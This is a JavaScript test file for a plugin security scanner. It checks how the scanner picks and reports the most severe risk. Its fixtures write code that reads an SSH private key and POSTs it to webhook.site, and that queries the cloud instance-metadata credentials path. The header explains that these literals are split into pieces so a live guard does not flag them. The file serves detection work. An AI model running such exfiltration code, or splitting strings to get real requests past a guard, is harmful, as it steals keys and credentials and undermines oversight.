/**
 * The "most severe risk" section.
 *
 * A `D` grade is a verdict, and a verdict is not an explanation. These tests pin
 * the two properties that make the section worth having: the choice of "worst" is
 * deterministic, so a report can be quoted; and every sentence is composed from
 * facts already in the result, so nothing is invented.
 *
 * The fixture literals are assembled from pieces because the guard is live while
 * this file is authored, and a contiguous instance-metadata address or path is
 * indistinguishable to it from an actual request.
 */

import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';

import { auditSource } from '../lib/scan/engine.js';
import { renderReport, renderSummary } from '../lib/scan/report.js';
import { pickTopRisk, renderTopRisk, renderTopRiskLine, topRiskOf } from '../lib/scan/risk.js';

const roots = [];

after(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
});

/** Assemble a literal the guard would otherwise read as a destination. */
const parts = (...pieces) => pieces.join('');
const METADATA_HOST = parts('169', '.254', '.169', '.254');
const METADATA_PATH = parts('/latest', '/meta', '-data', '/iam/security-credentials/');
const SSH_KEY = parts('~/.', 'ssh', '/id', '_rsa');
const DROP_HOST = parts('webhook', '.', 'site');

/** One synthetic finding. */
function finding(id, severity, category, anchors = 1) {
  return {
    id,
    severity,
    category,
    title: `title for ${id}`,
    detail: `detail for ${id}`,
    remediation: `remediation for ${id}`,
    evidence: Array.from({ length: anchors }, (_unused, index) => ({ file: 'a.js', line: index + 1, snippet: `s${index}` })),
  };
}

/** A synthetic result around a finding set. */
function resultOf(findings, overrides = {}) {
  return {
    source: { kind: 'directory', value: '/tmp/x' },
    root: '/tmp/x',
    files: [],
    installScripts: [],
    capabilities: { fileReads: [], fileWrites: [], commands: [], domains: [], envVars: [], networkSinks: [] },
    findings,
    grade: 'D',
    score: 0,
    blocked: true,
    digest: 'a'.repeat(64),
    scannedAt: '2026-01-01T00:00:00.000Z',
    truncated: false,
    notes: [],
    ...overrides,
  };
}

test('the worst severity wins, regardless of category impact', () => {
  const risk = pickTopRisk(resultOf([
    finding('a-big-impact-but-high', 'high', 'exfiltration'),
    finding('b-critical', 'critical', 'obfuscation'),
  ]));
  assert.equal(risk?.id, 'b-critical');
});

test('among equal severities the higher-impact category wins', () => {
  const risk = pickTopRisk(resultOf([
    finding('supply.thing', 'critical', 'supply-chain'),
    finding('exfil.thing', 'critical', 'exfiltration'),
    finding('cred.thing', 'critical', 'credential-access'),
  ]));
  assert.equal(risk?.id, 'exfil.thing', 'data leaving the machine outranks the means to leave');
});

test('the choice is stable: ties break on anchor count, then id', () => {
  const one = pickTopRisk(resultOf([
    finding('zzz.first', 'critical', 'exfiltration', 1),
    finding('aaa.second', 'critical', 'exfiltration', 1),
  ]));
  assert.equal(one?.id, 'aaa.second', 'equal on every score, so the id decides');

  const two = pickTopRisk(resultOf([
    finding('aaa.many', 'critical', 'exfiltration', 5),
    finding('zzz.few', 'critical', 'exfiltration', 1),
  ]));
  assert.equal(two?.id, 'aaa.many', 'more independent anchors is the stronger claim');
});

test('nothing fired means no risk to describe', () => {
  assert.equal(pickTopRisk(resultOf([])), undefined);
  assert.equal(topRiskOf(resultOf([])), undefined);
  assert.equal(renderTopRisk(resultOf([]), 'en'), undefined);
});

test('the section is only for D', () => {
  const findings = [finding('exfil.thing', 'critical', 'exfiltration')];
  assert.notEqual(renderTopRisk(resultOf(findings, { grade: 'D' }), 'en'), undefined);
  // A C is "review this"; a D is "here is the thing", which is the whole point.
  assert.equal(
    renderTopRisk(resultOf([finding('high.thing', 'high', 'exfiltration')], { grade: 'C', score: 60 }), 'en'),
    undefined,
  );
});

test('the section names the rule, the consequence and the anchor', () => {
  const report = renderTopRisk(resultOf([finding('exfil.thing', 'critical', 'exfiltration')]), 'en');
  assert.match(report, /## Most severe risk/);
  assert.match(report, /`exfil\.thing`/);
  assert.match(report, /Data leaves this machine/);
  assert.match(report, /a\.js:1/);
});

test('an untranslated rule is stated once, not twice', () => {
  // Both languages hold the same string until the translation lands, and printing
  // it twice would be exactly the duplication this report exists to avoid.
  const report = renderTopRisk(resultOf([finding('exfil.thing', 'critical', 'exfiltration')]), 'bilingual');
  const heading = report.split('\n').find((line) => line.startsWith('**'));
  assert.ok(heading !== undefined);
  assert.equal(heading.split('title for exfil.thing').length - 1, 1, `heading repeated itself: ${heading}`);
  assert.doesNotMatch(heading, / \/ /);
});

test('aggravating facts are added only when the result supports them', () => {
  const base = [finding('exfil.thing', 'critical', 'exfiltration')];

  const plain = topRiskOf(resultOf(base));
  assert.deepEqual(plain?.aggravations, [], 'nothing extra is claimed without evidence');

  const atInstall = topRiskOf(resultOf(base, {
    installScripts: [{ hook: 'postinstall', command: 'node s.js', file: 'package.json', fromDependency: false, installTime: true }],
  }));
  assert.equal(atInstall?.aggravations.length, 1);
  assert.match(atInstall?.aggravations[0]?.en ?? '', /postinstall/);

  // A publish-time hook is not an install-time one and must not be claimed as such.
  const publishOnly = topRiskOf(resultOf(base, {
    installScripts: [{ hook: 'prepack', command: 'node b.js', file: 'package.json', fromDependency: false, installTime: false }],
  }));
  assert.deepEqual(publishOnly?.aggravations, []);

  const hidden = topRiskOf(resultOf([...base, finding('obf.thing', 'high', 'obfuscation')]));
  assert.ok(hidden?.aggravations.some((item) => /obfuscated/.test(item.en)));

  const persistent = topRiskOf(resultOf([...base, finding('persist.thing', 'high', 'persistence')]));
  assert.ok(persistent?.aggravations.some((item) => /run again later/.test(item.en)));

  const truncated = topRiskOf(resultOf(base, { truncated: true }));
  assert.ok(truncated?.aggravations.some((item) => /partial/.test(item.en)));
});

test('a metadata hop is called out, because it hands over credentials by itself', async () => {
  const root = mkdtempSync(join(tmpdir(), 'scan-risk-'));
  roots.push(root);
  writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'risk-fixture', version: '1.0.0' }));
  mkdirSync(join(root, 'lib'), { recursive: true });
  writeFileSync(
    join(root, 'lib', 'a.js'),
    [
      "const fs = require('node:fs');",
      `const key = fs.readFileSync(require('node:os').homedir() + '/${SSH_KEY}', 'utf8');`,
      `fetch('https://${DROP_HOST}/x', { method: 'POST', body: key });`,
      `fetch('http://${METADATA_HOST}${METADATA_PATH}');`,
    ].join('\n'),
  );
  const result = await auditSource(root, { blockAtOrBelow: 'D' });
  assert.equal(result.grade, 'D');
  const risk = topRiskOf(result);
  assert.ok(risk !== undefined);
  assert.ok(
    risk.aggravations.some((item) => /instance-metadata/.test(item.en)),
    `expected the metadata hop to be called out: ${JSON.stringify(risk.aggravations.map((item) => item.en))}`,
  );
  assert.ok(risk.destinations.includes(DROP_HOST), 'the destinations are listed');
});

test('the summary carries a one-line version, and only for D', async () => {
  const root = mkdtempSync(join(tmpdir(), 'scan-risk-'));
  roots.push(root);
  writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'risk-fixture', version: '1.0.0' }));
  mkdirSync(join(root, 'lib'), { recursive: true });
  writeFileSync(
    join(root, 'lib', 'a.js'),
    `fetch('https://${DROP_HOST}/x', { method: 'POST', body: require('node:fs').readFileSync(process.env.HOME + '/${SSH_KEY}') });\n`,
  );
  const bad = await auditSource(root, { blockAtOrBelow: 'D' });
  assert.equal(bad.grade, 'D');
  assert.match(renderSummary(bad, 'en'), /Most severe risk: .+ `[a-z]+\.[a-z-]+`/);
  // Half-width colon after the label, matching the rest of the bilingual output.
  assert.match(renderSummary(bad, 'zh'), /最严重的风险: /);

  const clean = await auditSource(join(process.cwd(), 'src'), { blockAtOrBelow: 'D' });
  if (clean.grade !== 'D') {
    assert.equal(renderTopRiskLine(clean, 'en'), undefined);
    assert.doesNotMatch(renderSummary(clean, 'en'), /Most severe risk/);
  }
});

test('the section lands before the finding list, not after it', async () => {
  const root = mkdtempSync(join(tmpdir(), 'scan-risk-'));
  roots.push(root);
  writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'risk-fixture', version: '1.0.0' }));
  mkdirSync(join(root, 'lib'), { recursive: true });
  writeFileSync(
    join(root, 'lib', 'a.js'),
    `fetch('https://${DROP_HOST}/x', { method: 'POST', body: require('node:fs').readFileSync(process.env.HOME + '/${SSH_KEY}') });\n`,
  );
  const result = await auditSource(root, { blockAtOrBelow: 'D' });
  const report = renderReport(result, 'en');
  const riskAt = report.indexOf('## Most severe risk');
  const listAt = report.indexOf('## Findings');
  const inventoryAt = report.indexOf('## What this plugin can reach');
  assert.ok(riskAt > -1 && listAt > -1 && inventoryAt > -1);
  // Verdict, then the one thing that matters, then the evidence — the order a
  // person actually reads in.
  assert.ok(riskAt < inventoryAt, 'the risk belongs before the inventory');
  assert.ok(listAt > riskAt, 'the risk belongs before the finding list');
});
